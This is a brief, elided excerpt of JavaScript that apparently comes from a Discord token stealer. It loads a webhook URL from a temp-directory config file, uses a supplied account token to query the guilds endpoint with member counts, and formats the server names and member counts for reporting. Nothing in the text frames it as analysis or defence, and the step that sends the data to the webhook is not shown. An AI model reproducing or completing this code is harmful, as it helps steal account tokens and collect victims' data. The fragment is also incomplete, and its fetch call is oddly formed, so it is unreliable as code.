...
const configPath = path.join(os.tmpdir(), "config", "webhook.txt");

let webhook = fs.readFileSync(configPath, "utf8").trim();
...
const fetchServers = async (token) =>
  await fetch("/guilds?with_counts=true", {
    Authorization: token,
  });
...
const getServers = async (token) => {
  ...
  for (const guild of filteredGuilds) {
    ...
    } | Server Name: \`${guild.name}\` - Members: \`${
